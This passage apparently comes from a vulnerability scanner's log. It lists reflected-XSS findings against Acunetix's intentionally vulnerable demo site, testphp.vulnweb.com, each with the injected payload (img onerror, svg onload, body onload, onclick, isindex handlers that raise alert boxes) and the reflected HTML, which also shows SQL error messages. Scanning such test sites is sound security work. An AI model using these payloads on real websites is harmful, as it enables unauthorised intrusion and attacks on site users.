+    "response_text": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>pictures</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\tError: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\"><script>alert('XSS_MARKER_1761587104_7993')</script>' at line 1"
+  }
+}
+</pre>
+<pre>
+{
+  "timestamp": 13255,
+  "url": "http://testphp.vulnweb.com/listproducts.php?cat=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28%27XSS_MARKER_1761587105_3332%27%29%3E",
+  "marker": "XSS_MARKER_1761587105_3332",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587105_3332"
+  },
+  "meta": {
+    "type": "GET",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=3",
+    "param": "cat",
+    "params": {
+      "cat": "3"
+    },
+    "tested_url": "http://testphp.vulnweb.com/listproducts.php?cat=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28%27XSS_MARKER_1761587105_3332%27%29%3E",
+    "response_text": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>pictures</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\tError: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\"><img src=x onerror=alert('XSS_MARKER_1761587105_3332')>' at line 1"
+  }
+}
+</pre>
+<pre>
+{
+  "timestamp": 13256,
+  "url": "http://testphp.vulnweb.com/search.php?test=query",
+  "marker": "XSS_MARKER_1761587106_5493",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587106_5493"
+  },
+  "meta": {
+    "type": "FORM",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=3",
+    "method": "POST",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "param": "searchFor",
+    "form_fields": {
+      "searchFor": "",
+      "goButton": "go"
+    },
+    "tested_url": "http://testphp.vulnweb.com/search.php?test=query",
+    "response_text": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>search</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- here goes headers headers -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\t<h2 id='pageName'>searched for: <body onload=alert('XSS_MARKER_1761587106_5493')></h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '')>', a.title) > 0 OR LOCATE('<body onload=alert('XSS_MARKER_1761587106_5493')>'' at line 3"
+  }
+}
+</pre>
+<pre>
+{
+  "timestamp": 13256,
+  "url": "http://testphp.vulnweb.com/search.php?test=query",
+  "marker": "XSS_MARKER_1761587106_5292",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587106_5292"
+  },
+  "meta": {
+    "type": "FORM",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=4",
+    "method": "POST",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "param": "searchFor",
+    "form_fields": {
+      "searchFor": "",
+      "goButton": "go"
+    },
+    "tested_url": "http://testphp.vulnweb.com/search.php?test=query",
+    "response_text": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>search</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- here goes headers headers -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\t<h2 id='pageName'>searched for: {alert('XSS_MARKER_1761587106_5292')}</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '')}', a.title) > 0 OR LOCATE('{alert('XSS_MARKER_1761587106_5292')}', a.pshort) ' at line 3"
+  }
+}
+</pre>
+<pre>
+{
+  "timestamp": 13257,
+  "url": "http://testphp.vulnweb.com/artists.php?artist=%27%3E%3Cimg+src%3Dx+onerror%3Dalert%28%27XSS_MARKER_1761587107_9767%27%29%3E",
+  "marker": "XSS_MARKER_1761587107_9767",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587107_9767"
+  },
+  "meta": {
+    "type": "GET",
+    "url": "http://testphp.vulnweb.com/artists.php?artist=1",
+    "param": "artist",
+    "params": {
+      "artist": "1"
+    },
+    "tested_url": "http://testphp.vulnweb.com/artists.php?artist=%27%3E%3Cimg+src%3Dx+onerror%3Dalert%28%27XSS_MARKER_1761587107_9767%27%29%3E",
+    "response_text": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>artists</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- here goes headers headers -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\tError: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'XSS_MARKER_1761587107_9767')>' at line 1"
+  }
+}
+</pre>
+<pre>
+{
+  "timestamp": 13257,
+  "url": "http://testphp.vulnweb.com/search.php?test=query",
+  "marker": "XSS_MARKER_1761587107_3800",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587107_3800"
+  },
+  "meta": {
+    "type": "FORM",
+    "url": "http://testphp.vulnweb.com/artists.php?artist=1",
+    "method": "POST",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "param": "searchFor",
+    "form_fields": {
+      "searchFor": "",
+      "goButton": "go"
+    },
+    "tested_url": "http://testphp.vulnweb.com/search.php?test=query",
+    "response_text": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>search</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- here goes headers headers -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\t<h2 id='pageName'>searched for: <a href='#' onclick='alert(\"XSS_MARKER_1761587107_3800\")'>click</a></h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 3"
+  }
+}
+</pre>
+<pre>
+{
+  "timestamp": 13258,
+  "url": "http://testphp.vulnweb.com/search.php?test=query",
+  "marker": "XSS_MARKER_1761587108_4823",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587108_4823"
+  },
+  "meta": {
+    "type": "FORM",
+    "url": "http://testphp.vulnweb.com/artists.php?artist=2",
+    "method": "POST",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "param": "searchFor",
+    "form_fields": {
+      "searchFor": "",
+      "goButton": "go"
+    },
+    "tested_url": "http://testphp.vulnweb.com/search.php?test=query",
+    "response_text": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>search</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- here goes headers headers -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\t<h2 id='pageName'>searched for: {alert('XSS_MARKER_1761587108_4823')}</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '')}', a.title) > 0 OR LOCATE('{alert('XSS_MARKER_1761587108_4823')}', a.pshort) ' at line 3"
+  }
+}
+</pre>
+<pre>
+{
+  "timestamp": 13259,
+  "url": "http://testphp.vulnweb.com/artists.php?artist=%3Csvg+onload%3Dalert%28%27XSS_MARKER_1761587109_4020%27%29%3E%3C%2Fsvg%3E",
+  "marker": "XSS_MARKER_1761587109_4020",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587109_4020"
+  },
+  "meta": {
+    "type": "GET",
+    "url": "http://testphp.vulnweb.com/artists.php?artist=3",
+    "param": "artist",
+    "params": {
+      "artist": "3"
+    },
+    "tested_url": "http://testphp.vulnweb.com/artists.php?artist=%3Csvg+onload%3Dalert%28%27XSS_MARKER_1761587109_4020%27%29%3E%3C%2Fsvg%3E",
+    "response_text": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>artists</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- here goes headers headers -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\tError: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '=<svg onload=alert('XSS_MARKER_1761587109_4020')></svg>' at line 1"
+  }
+}
+</pre>
+<pre>
+{
+  "timestamp": 13259,
+  "url": "http://testphp.vulnweb.com/search.php?test=query",
+  "marker": "XSS_MARKER_1761587109_7030",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587109_7030"
+  },
+  "meta": {
+    "type": "FORM",
+    "url": "http://testphp.vulnweb.com/artists.php?artist=3",
+    "method": "POST",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "param": "searchFor",
+    "form_fields": {
+      "searchFor": "",
+      "goButton": "go"
+    },
+    "tested_url": "http://testphp.vulnweb.com/search.php?test=query",
+    "response_text": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>search</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- here goes headers headers -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\t<h2 id='pageName'>searched for: <isindex type=submit onsubmit='alert(\"XSS_MARKER_1761587109_7030\");return false;'></h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(\"XSS_MARKER_1761587109_7030\");return false;'>', a.title) > 0 OR LOCATE('<isinde' at line 3"
+  }
+}
+</pre>
+<pre>
+{
+  "timestamp": 13260,
+  "url": "http://testphp.vulnweb.com/secured/newuser.php",
+  "marker": "XSS_MARKER_1761587110_4923",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587110_4923"
+  },
+  "meta": {
+    "type": "FORM",
+    "url": "http://testphp.vulnweb.com/signup.php",
+    "method": "POST",
+    "action": "http://testphp.vulnweb.com/secured/newuser.php",
+    "param": "uuname",
+    "form_fields": {
+      "uuname": "",
+      "upass": "",
+      "upass2": "",
+      "urname": "",
+      "ucc": "",
+      "uemail": "",
+      "uphone": "",
+      "uaddress": "",
+      "signup": "signup"
+    },
+    "tested_url": "http://testphp.vulnweb.com/secured/newuser.php",
+    "response_text": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\r\n<html>\r\n<head>\r\n<title>add new user</title>\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\r\n<link href=\"style.css\" rel=\"stylesheet\" type=\"text/css\">\r\n</head>\r\n<body>\r\n<div id=\"masthead\"> \r\n  <h1 id=\"siteName\">ACUNETIX ART</h1> \r\n</div>\r\n<div id=\"content\">\r\n\tUnable to access user database: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'XSS_MARKER_1761587110_4923')>Click'' at line 1"
